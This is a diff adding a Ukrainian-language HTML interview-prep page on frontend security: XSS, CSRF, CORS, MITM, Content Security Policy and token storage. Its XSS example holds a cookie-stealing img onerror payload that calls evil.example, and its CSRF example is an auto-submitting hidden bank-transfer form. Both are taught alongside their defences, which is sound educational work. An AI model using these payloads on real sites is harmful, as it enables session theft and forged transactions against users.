@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>3. Безпека фронтенду — JS Doc</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27><polygon points=%2750,8 92,50 50,92 8,50%27 fill=%27white%27/></svg>">
+<style>
+  :root{
+    --bg:#ffffff; --bg-soft:#f6f7f9; --card:#ffffff; --border:#e3e6ea;
+    --fg:#1a1d23; --fg-muted:#5b6270;
+    --accent:#2f6feb; --accent-soft:#eaf1ff;
+    --code-bg:#1e2230; --code-fg:#e7eaf2; --code-muted:#8b93a7;
+    --good:#1a7f4b; --good-bg:#e8f7ee; --good-border:#b6e3c6;
+    --bad:#c0392b; --bad-bg:#fdecea; --bad-border:#f3c2bb;
+    --warn:#9a6700; --warn-bg:#fff6e5; --warn-border:#f0dca3;
+    --info:#2f6feb; --info-bg:#eaf1ff; --info-border:#c6dafc;
+    --fun:#0f8a8a; --fun-bg:#e6f7f7; --fun-border:#bfe8e8;
+    --radius:12px;
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#14161b; --bg-soft:#1b1e25; --card:#1b1e25; --border:#2b2f3a;
+      --fg:#e7eaf2; --fg-muted:#9aa2b4;
+      --accent:#6d9bff; --accent-soft:#1c2740;
+      --code-bg:#0e1016; --code-fg:#e7eaf2; --code-muted:#7c8494;
+      --good:#5fd08d; --good-bg:#12261c; --good-border:#255c3c;
+      --bad:#ff8a7a; --bad-bg:#301716; --bad-border:#6b2a25;
+      --warn:#f0c25a; --warn-bg:#2c2411; --warn-border:#5c4a1c;
+      --info:#7fb0ff; --info-bg:#131f33; --info-border:#28416b;
+      --fun:#5fd6d6; --fun-bg:#0f2626; --fun-border:#1f4d4d;
+    }
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.6; font-size:16px;
+  }
+  code{font-family:"SF Mono",ui-monospace,"Fira Code",Consolas,"Cascadia Code",monospace;}
+
+  header.top{
+    position:sticky; top:0; z-index:20;
+    background:color-mix(in srgb, var(--bg) 88%, transparent);
+    backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--border);
+  }
+  .top-inner{max-width:1180px; margin:0 auto; padding:14px 24px;}
+  .brand{font-weight:700; font-size:15px; white-space:nowrap;}
+  .brand span{color:var(--accent);}
+
+  .hero{max-width:1180px; margin:0 auto; padding:46px 24px 18px;}
+  .hero .kicker{
+    color:var(--fun); font-weight:700; font-size:13px; letter-spacing:.06em;
+    text-transform:uppercase;
+  }
+  .hero h1{font-size:34px; margin:8px 0 10px; letter-spacing:-.02em;}
+  .hero p.lead{color:var(--fg-muted); font-size:17px; max-width:780px; margin:0;}
+  .hero .pills{display:flex; gap:8px; flex-wrap:wrap; margin-top:16px;}
+  .hero .pill{
+    font-size:12.5px; font-weight:600; padding:5px 12px; border-radius:999px;
+    background:var(--fun-bg); color:var(--fun); border:1px solid var(--fun-border);
+  }
+
+  .layout{
+    max-width:1440px; margin:0 auto; padding:20px 24px 100px;
+    display:flex; align-items:flex-start; gap:24px;
+  }
+  .nav-sidebar, aside.toc{flex-shrink:0;}
+  .nav-sidebar{width:180px;}
+  aside.toc{width:230px;}
+  .content-center{flex:1; min-width:0; display:flex; justify-content:center;}
+  .content-center > article{width:100%; max-width:780px;}
+  @media (max-width:900px){ .layout{flex-direction:column;}
+    .nav-sidebar, aside.toc{width:100%; position:static;}
+    .content-center{display:block;} }
+
+  .nav-sidebar{
+    position:sticky; top:74px; max-height:calc(100vh - 100px); overflow:auto;
+    border:1px solid var(--border); border-radius:var(--radius); background:var(--bg-soft);
+    padding:14px; display:flex; flex-direction:column; gap:4px;
+  }
+  .nav-sidebar input.tab-radio{display:none;}
+  .nav-tabbar{display:flex; flex-direction:column; gap:6px; margin-bottom:6px;}
+  .nav-tabbtn{
+    cursor:pointer; user-select:none; text-align:left; padding:8px 12px; border-radius:9px;
+    font-size:12.5px; font-weight:700; letter-spacing:.01em; color:var(--fg-muted);
+    border:1px solid var(--border); background:var(--card);
+    transition:background .15s, color .15s, border-color .15s;
+  }
+  .nav-tabbtn:hover{background:var(--bg);}
+  #tab-project:checked ~ .nav-tabbar label[for="tab-project"],
+  #tab-interview:checked ~ .nav-tabbar label[for="tab-interview"],
+  #tab-jsdoc:checked ~ .nav-tabbar label[for="tab-jsdoc"]{
+    background:var(--accent); color:#fff; border-color:var(--accent);
+  }
+  .nav-links{display:none; flex-direction:column; gap:2px;}
+  #tab-project:checked ~ .nav-links.proj{display:flex;}
+  #tab-interview:checked ~ .nav-links.interview{display:flex;}
+  #tab-jsdoc:checked ~ .nav-links.jsdoc{display:flex;}
+  .nav-links a{
+    text-decoration:none; color:var(--fg-muted); font-size:13px;
+    padding:6px 10px; border-radius:7px; line-height:1.3;
+  }
+  .nav-links a:hover{background:var(--card); color:var(--fg);}
+  .nav-links a.active{background:var(--accent-soft); color:var(--accent); font-weight:600;}
+
+  aside.toc{
+    position:sticky; top:74px; max-height:calc(100vh - 100px); overflow:auto;
+    border:1px solid var(--border); border-radius:var(--radius); background:var(--bg-soft);
+    padding:16px;
+  }
+  aside.toc .toc-title{font-size:12px; text-transform:uppercase; letter-spacing:.06em; color:var(--fg-muted); font-weight:700; margin-bottom:10px;}
+  aside.toc ol{list-style:none; margin:0; padding:0;}
+  aside.toc li{margin:0 0 4px;}
+  aside.toc a{
+    display:block; text-decoration:none; color:var(--fg-muted); font-size:13.5px;
+    padding:6px 8px; border-radius:8px; line-height:1.35;
+  }
+  aside.toc a:hover{background:var(--card); color:var(--fg);}
+
+  article section{margin-bottom:44px; scroll-margin-top:80px;}
+  .cat-head{display:flex; align-items:center; gap:12px; margin-bottom:4px;}
+  .cat-letter{
+    width:34px; height:34px; border-radius:10px; background:var(--accent-soft); color:var(--accent);
+    display:flex; align-items:center; justify-content:center; font-weight:800; font-size:15px; flex-shrink:0;
+  }
+  article h2{font-size:22px; margin:0; letter-spacing:-.01em;}
+  article p{color:var(--fg); margin:10px 0;}
+  .section-desc{color:var(--fg-muted); margin-top:2px; margin-bottom:16px;}
+
+  .tag{
+    flex-shrink:0; display:inline-block; font-size:10.5px; font-weight:700; padding:3px 9px;
+    border-radius:999px; white-space:nowrap;
+  }
+  .tag.recurring{background:var(--bad-bg); color:var(--bad); border:1px solid var(--bad-border);}
+  .tag.gap{background:var(--warn-bg); color:var(--warn); border:1px solid var(--warn-border);}
+  .tag.rising{background:var(--fun-bg); color:var(--fun); border:1px solid var(--fun-border);}
+  .tag.strength{background:var(--good-bg); color:var(--good); border:1px solid var(--good-border);}
+
+  .legend{display:flex; gap:14px; flex-wrap:wrap; margin:16px 0 22px; font-size:12.8px; color:var(--fg-muted);}
+  .legend span{display:inline-flex; align-items:center; gap:6px;}
+
+  .card{
+    border:1px solid var(--border); border-radius:var(--radius); background:var(--card);
+    padding:18px 20px; margin:16px 0;
+  }
+  .callout{
+    border-radius:var(--radius); border:1px solid; padding:14px 16px; margin:16px 0;
+    display:flex; gap:12px; align-items:flex-start; font-size:14.5px;
+  }
+  .callout .ic{font-size:17px; line-height:1.4;}
+  .callout.info{background:var(--info-bg); border-color:var(--info-border); color:var(--info);}
+  .callout.good{background:var(--good-bg); border-color:var(--good-border); color:var(--good);}
+  .callout.warn{background:var(--warn-bg); border-color:var(--warn-border); color:var(--warn);}
+  .callout.bad{background:var(--bad-bg); border-color:var(--bad-border); color:var(--bad);}
+  .callout .body{color:var(--fg);}
+  .callout .body b{color:inherit;}
+
+  table{width:100%; border-collapse:collapse; margin:16px 0; font-size:14px;}
+  th, td{text-align:left; padding:10px 12px; border-bottom:1px solid var(--border); vertical-align:top;}
+  th{color:var(--fg-muted); font-weight:600; font-size:12.5px; text-transform:uppercase; letter-spacing:.03em;}
+  tr:last-child td{border-bottom:none;}
+
+  footer.page{
+    max-width:1180px; margin:0 auto; padding:20px 24px 60px; color:var(--fg-muted); font-size:13.5px;
+    border-top:1px solid var(--border); margin-top:20px; padding-top:24px;
+  }
+
+  .topic-head{display:flex; align-items:center; gap:10px; margin-bottom:6px;}
+  .topic-head h2{font-size:21px; margin:0; letter-spacing:-.01em;}
+  .codecard{border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:14px 0; background:var(--code-bg);}
+  .codecard .bar{display:flex; align-items:center; justify-content:space-between; gap:10px; padding:8px 14px; background:color-mix(in srgb, var(--code-bg) 80%, black 6%); border-bottom:1px solid color-mix(in srgb, var(--code-fg) 12%, transparent);}
+  .codecard .bar .path{color:var(--code-muted); font-size:12.5px;}
+  .codecard pre{margin:0; padding:16px; overflow:auto;}
+  .codecard code{color:var(--code-fg); font-size:13px; white-space:pre; font-family:"SF Mono",ui-monospace,"Fira Code",Consolas,"Cascadia Code",monospace;}
+  .codecard code .tok-kw{color:#cc7832;}
+  .codecard code .tok-str{color:#6a8759;}
+  .codecard code .tok-num{color:#6897bb;}
+  .codecard code .tok-com{color:#7f7f7f; font-style:italic;}
+  .codecard code .tok-def{color:#ffc66d;}
+</style>
+</head>
+<body>
+
+<header class="top">
+  <div class="top-inner">
+    <div class="brand">📚 JS Interview Prep <span>· AI Delivery Planner backend</span></div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="kicker">JS Doc · Категорія 3</div>
+  <h1>Безпека фронтенду</h1>
+  <p class="lead">
+    Базова обізнаність про ці атаки вже підтверджена на реальних технічних інтерв'ю як сильна
+    сторона — тут завдання не вивчити абревіатури заново, а вміти пояснити <b>точний механізм</b>
+    кожної атаки й захисту на прикладі, а не просто назвати термін.
+  </p>
+  <div class="pills">
+    <span class="pill">✅ Підтверджена сильна сторона — поглиблюємо</span>
+  </div>
+</div>
+
+<div class="layout">
+  <aside class="nav-sidebar">
+    <input type="radio" name="topgroup" id="tab-project" class="tab-radio">
+    <input type="radio" name="topgroup" id="tab-interview" class="tab-radio">
+    <input type="radio" name="topgroup" id="tab-jsdoc" class="tab-radio" checked>
+    <div class="nav-tabbar">
+      <label for="tab-project" class="nav-tabbtn">📁 Про проєкт</label>
+      <label for="tab-interview" class="nav-tabbtn">🐍 Python Doc</label>
+      <label for="tab-jsdoc" class="nav-tabbtn">📚 JS Doc</label>
+    </div>
+      <nav class="nav-links proj">
+        <a href="../python-tutorials/01-architecture.html">1. Архітектура</a>
+        <a href="../python-tutorials/02-async-and-security.html">2. Async &amp; Безпека</a>
+        <a href="../python-tutorials/03-scaling.html">3. Масштабування</a>
+      </nav>
+      <nav class="nav-links interview">
+        <a href="../python-tutorials/04-gil-and-concurrency.html">4. GIL &amp; Конкурентність</a>
+        <a href="../python-tutorials/05-python-types.html">5. Типи</a>
+        <a href="../python-tutorials/06-senior-interview-qa.html">6. 30 питань Senior</a>
+        <a href="../python-tutorials/07-classes-decorators-syntax.html">7. Класи &amp; цукор</a>
+        <a href="../python-tutorials/08-wsgi-asgi.html">8. WSGI vs ASGI</a>
+        <a href="../python-tutorials/09-generators-iterators-exceptions.html">9. Генератори &amp; Винятки</a>
+        <a href="../python-tutorials/10-logging.html">10. Логування</a>
+        <a href="../python-tutorials/11-serialization-and-numbers.html">11. Серіалізація &amp; числа</a>
+        <a href="../python-tutorials/12-stdlib-utilities.html">12. Утиліти stdlib</a>
+        <a href="../python-tutorials/13-packaging-and-dependencies.html">13. Пакування</a>
+        <a href="../python-tutorials/14-design-patterns.html">14. Патерни</a>
+        <a href="../python-tutorials/15-memory-management.html">15. Пам'ять &amp; GC</a>
+        <a href="../python-tutorials/16-oop-and-solid.html">16. ООП &amp; SOLID</a>
+        <a href="../python-tutorials/17-databases-fundamentals.html">17. Бази даних: основи</a>
+        <a href="../python-tutorials/18-databases-interview-qa.html">18. Бази даних: Q&amp;A</a>
+      </nav>
+      <nav class="nav-links jsdoc">
+        <a href="00-methodology.html">0. Методологія</a>
+        <a href="01-core-js-engine.html">1. Core JS та рушій</a>
+        <a href="02-browser-internals.html">2. Браузер зсередини</a>
+        <a href="03-frontend-security.html" class="active">3. Безпека фронтенду</a>
+        <a href="04-algorithms-patterns.html">4. Алгоритми й патерни</a>
+        <a href="05-react-deep-dive.html">5. React углиб</a>
+        <a href="06-nextjs-architecture.html">6. Next.js та архітектура</a>
+        <a href="07-nextjs-interview-qa.html">7. Next.js: Q&amp;A</a>
+        <a href="08-data-realtime.html">8. Дані й реальний час</a>
+        <a href="09-testing-cicd-cloud.html">9. Тести, CI/CD, хмара</a>
+        <a href="10-ai-tools.html">10. AI-інструменти</a>
+        <a href="11-http-anatomy.html">11. HTTP: анатомія запитів</a>
+        <a href="12-this.html">12. this</a>
+      </nav>
+  </aside>
+
+  <aside class="toc">
+    <div class="toc-title">На цій сторінці</div>
+    <ol>
+      <li><a href="#t1">1. XSS, CSRF, CORS, MITM</a></li>
+      <li><a href="#t2">2. Content Security Policy</a></li>
+      <li><a href="#t3">3. Безпечне зберігання токенів</a></li>
+    </ol>
+  </aside>
+
+  <div class="content-center">
+    <article>
+
+    <section id="t1">
+      <div class="topic-head"><span class="tag strength">✅</span><h2>XSS, CSRF, CORS, Man-in-the-Middle</h2></div>
+      <p>Чотири абревіатури, які на співбесіді майже завжди питають підряд — і майже завжди
+      приймають відповідь-визначення. Різниця між "знає абревіатуру" й "розуміє механізм" видно
+      в одному уточнювальному питанні: <i>хто саме жертва</i> й <i>що конкретно</i> в браузері чи
+      мережі дозволяє атаці спрацювати.</p>
+
+      <p><b>XSS (Cross-Site Scripting)</b> — зловмисний JavaScript виконується в браузері жертви
+      в контексті довіреного сайту. Класичний приклад — <b>stored XSS</b>: застосунок зберігає
+      коментар користувача як є і рендерить його як HTML замість тексту.</p>
+      <div class="codecard">
+        <div class="bar"><span class="path">вразливо</span></div>
+        <pre><code>// коментар від користувача: &lt;img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)"&gt;
+element.innerHTML = comment.text; // браузер виконає onerror як звичайний JS
+
+// безпечно — текст лишається текстом, HTML-теги не інтерпретуються
+element.textContent = comment.text;</code></pre>
+      </div>
+      <p>Жертва тут — будь-який інший користувач, що просто відкрив сторінку з цим коментарем;
+      зловмисник ніколи не торкається їхнього браузера напряму, скрипт запускає сам браузер
+      жертви. Головний захист — ніколи не вставляти сирий ввід користувача як HTML
+      (<code>textContent</code> замість <code>innerHTML</code>, або санітизація/екранування,
+      якщо HTML справді потрібен), плюс CSP як другий рубіж (розділ 2 нижче).</p>
+
+      <p><b>CSRF (Cross-Site Request Forgery)</b> — зловмисний сайт змушує браузер жертви
+      відправити запит на інший сайт, де жертва вже автентифікована, використовуючи те, що
+      браузер автоматично додає cookie до запиту незалежно від того, звідки завантажена сторінка,
+      яка цей запит ініціює.</p>
+      <div class="codecard">
+        <div class="bar"><span class="path">evil.example/page.html</span></div>
+        <pre><code>&lt;!-- жертва залогінена на bank.example, cookie сесії вже в браузері --&gt;
+&lt;form action="https://bank.example/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker-account"&gt;
+  &lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;
+&lt;!-- браузер автоматично додасть cookie сесії bank.example до цього POST --&gt;</code></pre>
+      </div>
+      <p>Жертва тут — сам користувач, чиєю сесією зловживають без його відома. Основний захист —
+      CSRF-токен, унікальний для сесії/форми, якого зловмисний сайт не може прочитати й підставити,
+      плюс cookie з атрибутом <code>SameSite=Lax</code> чи <code>Strict</code>, що не дає браузеру
+      взагалі відправити cookie в такому крос-сайтовому запиті.</p>
+
+      <p><b>CORS (Cross-Origin Resource Sharing)</b> — тут важливо розуміти, що CORS <i>не</i> атака
+      й не серверний захист сам по собі, а <b>браузерний</b> механізм, який за замовчуванням
+      забороняє JS-коду з одного origin читати відповідь запиту до іншого origin, якщо той інший
+      origin явно не дозволив це заголовком <code>Access-Control-Allow-Origin</code>. Запит
+      технічно все одно йде на сервер (сервер його може навіть виконати) — CORS лише блокує
+      браузеру віддати JS-коду <i>відповідь</i>. Тому CORS захищає користувача читання чужих
+      даних через браузер жертви, а не сервер від атаки як такої.</p>
+
+      <p><b>Man-in-the-Middle (MITM)</b> — атака на рівні мережі, а не браузера: зловмисник
+      перехоплює трафік між клієнтом і сервером (незахищений Wi-Fi, скомпрометований роутер,
+      підроблений DNS) і може читати чи підміняти дані в польоті. Жертва — обидві сторони з'єднання.
+      Захист — HTTPS/TLS: шифрування робить перехоплений трафік нечитабельним і виявляє підміну
+      сертифіката.</p>
+
+      <table>
+        <tr><th>Атака</th><th>Хто жертва</th><th>Основний захист</th></tr>
+        <tr><td>XSS</td><td>Інший користувач, що відкрив сторінку</td><td>Ніколи не рендерити сирий ввід як HTML; CSP</td></tr>
+        <tr><td>CSRF</td><td>Автентифікований користувач</td><td>CSRF-токен; <code>SameSite</code> cookie</td></tr>
+        <tr><td>CORS-обхід</td><td>Користувач, чиї дані читає чужий origin</td><td>Коректний <code>Access-Control-Allow-Origin</code> на сервері</td></tr>
+        <tr><td>MITM</td><td>Обидві сторони з'єднання</td><td>HTTPS/TLS, HSTS</td></tr>
+      </table>
+
+      <div class="callout good">
+        <div class="ic">🎯</div>
+        <div class="body"><b>Що перевіряють насправді:</b> чи можете ви одним реченням пояснити,
+        <i>чому</i> конкретний захід захищає саме від цієї атаки, а не просто перерахувати
+        абревіатури й "загальні заходи безпеки" без прив'язки до механізму.</div>
+      </div>
+    </section>
+
+    <section id="t2">
+      <div class="topic-head"><span class="tag gap">🟡</span><h2>Content Security Policy (CSP)</h2></div>
+      <p>CSP — HTTP-заголовок відповіді (<code>Content-Security-Policy</code>), яким сервер
+      каже браузеру: "виконуй скрипти й підвантажуй ресурси <i>тільки</i> з цих джерел, і ніяк
+      інакше". Це другий рубіж захисту від XSS: навіть якщо десь у коді лишилась діра для
+      ін'єкції, CSP може не дати впровадженому скрипту виконатись узагалі.</p>
+      <div class="codecard">
+        <div class="bar"><span class="path">приклад заголовка</span></div>
+        <pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  style-src 'self' 'unsafe-inline';
+  connect-src 'self' https://api.example.com;
+  object-src 'none';</code></pre>
+      </div>
+      <p>Тут <code>script-src 'self' https://cdn.example.com</code> означає: браузер виконає лише
+      скрипти, завантажені з того самого origin або з довіреного CDN — <b>інлайн-скрипт</b>,
+      впроваджений через XSS прямо в HTML (наприклад, <code>&lt;script&gt;fetch(...)&lt;/script&gt;</code>
+      всередині вкраденого коментаря), просто не виконається, навіть якщо він фізично потрапив
+      у DOM. Це не закриває саму діру ін'єкції — воно суттєво звужує, що зловмисник може зробити,
+      навіть якщо діра є.</p>
+      <div class="callout warn">
+        <div class="ic">⚠️</div>
+        <div class="body">CSP — це <b>захист у глибину</b> (defense in depth), а не заміна
+        правильної санітизації вводу. Директива <code>'unsafe-inline'</code> у <code>script-src</code>
+        (на відміну від <code>style-src</code> вище) звела б захист від XSS майже нанівець — саме
+        тому інлайн-скрипти в сучасних CSP-налаштуваннях зазвичай заборонені за замовчуванням.</div>
+      </div>
+    </section>
+
+    <section id="t3">
+      <div class="topic-head"><span class="tag gap">🟡</span><h2>Безпечне зберігання токенів на практиці</h2></div>
+      <p>Тема сховищ браузера (<a href="02-browser-internals.html#t3">туторіал B</a>) вже пояснює,
+      <i>чому</i> <code>localStorage</code> ризикований для токенів. Тут — практичне рішення:
+      як реально розподілити access/refresh токени між трьома доступними варіантами сховища.</p>
+
+      <table>
+        <tr><th>Сховище</th><th>Читається JS зі сторінки?</th><th>Уразливість до XSS</th><th>Автоматично шлеться в запитах?</th><th>Уразливість до CSRF</th></tr>
+        <tr><td><code>httpOnly</code>-cookie + <code>SameSite</code></td><td>Ні</td><td>Захищено</td><td>Так (браузер сам додає)</td><td>Пом'якшено <code>SameSite=Lax/Strict</code></td></tr>
+        <tr><td>Змінна в пам'яті застосунку (не збережена)</td><td>Так (це і є ризик)</td><td>Вразливо лише поки виконується шкідливий скрипт</td><td>Ні</td><td>Не застосовно</td></tr>
+        <tr><td><code>localStorage</code></td><td>Так</td><td>Повністю вразливо, доступно будь-якому скрипту на сторінці</td><td>Ні</td><td>Не застосовно</td></tr>
+      </table>
+
+      <p>Практична рекомендація, яку варто вміти обґрунтувати, а не просто назвати: довгоживучий
+      <b>refresh-токен</b> — у <code>httpOnly</code>-cookie з <code>SameSite=Lax</code> (JS до
+      нього взагалі не має доступу, тож XSS його вкрасти не може); короткоживучий
+      <b>access-токен</b> (хвилини) — тримати лише в пам'яті застосунку (змінна модуля/стору,
+      не персиститься), щоб навіть за успішної XSS-атаки зловмисник отримав токен з коротким
+      вікном дії, а не безстрокову сесію. <code>localStorage</code> для будь-якого з двох токенів
+      комбінує гірші сторони обох підходів — тому вважається антипатерном для SPA-автентифікації.</p>
+
+      <div class="callout good">
+        <div class="ic">🎯</div>
+        <div class="body"><b>Що перевіряють насправді:</b> чи розумієте ви компроміс, а не лише
+        "правильну відповідь" — <code>httpOnly</code>-cookie сама по собі не панацея (вона відкриває
+        поверхню для CSRF, яку закриває <code>SameSite</code>), тому безпека тут — комбінація двох
+        механізмів, а не один "правильний" вибір сховища.</div>
+      </div>
+    </section>
+
+    <div class="card">
+      <a href="02-browser-internals.html">← 2. Браузер зсередини</a>
+      &nbsp;·&nbsp;
+      <a href="04-algorithms-patterns.html">Далі: 4. Алгоритми й патерни →</a>
+    </div>
+
+    </article>
+  </div>
+</div>
+
+<footer class="page">
+  Теми узагальнені з патернів реального фідбеку технічних інтерв'ю — без імен, компаній чи
+  контактних даних, лише самі теми для цілеспрямованої підготовки.
+</footer>
+
+
+<script>
+(function(){
+  function esc(s){
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+  var RE = /(\/\/[^\n]*)|(\/\*[\s\S]*?\*\/)|(`(?:\\.|[^`\\])*`)|('(?:\\.|[^'\\\n])*'|"(?:\\.|[^"\\\n])*")|(\b\d[\d_]*\.?[\d_]*(?:[eE][+-]?\d+)?n?\b)|(\bfunction\s*\*?\s+)([A-Za-z_$][\w$]*)|(\bclass\s+)([A-Za-z_$][\w$]*)|((?<!\.)\b(?:function|return|if|else|for|while|do|break|continue|switch|case|default|class|extends|super|new|delete|typeof|instanceof|in|of|try|catch|finally|throw|async|await|yield|import|export|from|as|static|get|set|void|let|const|var|null|undefined|true|false|this)\b)/g;
+  function hl(text){
+    var out = '', last = 0, m;
+    RE.lastIndex = 0;
+    while((m = RE.exec(text))){
+      if(m.index > last) out += esc(text.slice(last, m.index));
+      if(m[1] !== undefined) out += '<span class="tok-com">'+esc(m[1])+'</span>';
+      else if(m[2] !== undefined) out += '<span class="tok-com">'+esc(m[2])+'</span>';
+      else if(m[3] !== undefined) out += '<span class="tok-str">'+esc(m[3])+'</span>';
+      else if(m[4] !== undefined) out += '<span class="tok-str">'+esc(m[4])+'</span>';
+      else if(m[5] !== undefined) out += '<span class="tok-num">'+esc(m[5])+'</span>';
+      else if(m[6] !== undefined) out += '<span class="tok-kw">'+esc(m[6])+'</span><span class="tok-def">'+esc(m[7])+'</span>';
+      else if(m[8] !== undefined) out += '<span class="tok-kw">'+esc(m[8])+'</span><span class="tok-def">'+esc(m[9])+'</span>';
+      else if(m[10] !== undefined) out += '<span class="tok-kw">'+esc(m[10])+'</span>';
+      last = RE.lastIndex;
+    }
+    out += esc(text.slice(last));
+    return out;
+  }
+  var blocks = document.querySelectorAll('.codecard pre code');
+  for(var i=0;i<blocks.length;i++){
+    blocks[i].innerHTML = hl(blocks[i].textContent);
+  }
+})();
+</script>
+</body>
+</html>
